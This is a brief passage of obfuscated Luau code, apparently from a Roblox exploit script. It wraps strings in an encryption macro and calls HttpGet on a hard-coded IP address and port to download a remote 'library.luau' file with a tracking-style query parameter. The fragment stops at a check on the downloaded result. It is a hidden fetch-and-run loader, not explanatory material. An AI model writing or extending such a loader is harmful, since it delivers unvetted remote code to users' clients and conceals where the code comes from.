		local dl8dyc, lco65o = pcall(function()
			return game:HttpGet(LPH_ENCSTR("http://45.43.163.142:25576/library.luau") .. LPH_ENCSTR("?g8r7m6=") .. g8r7m6)
		end)

		if dl8dyc and dl5m3j(lco65o, 2000) then
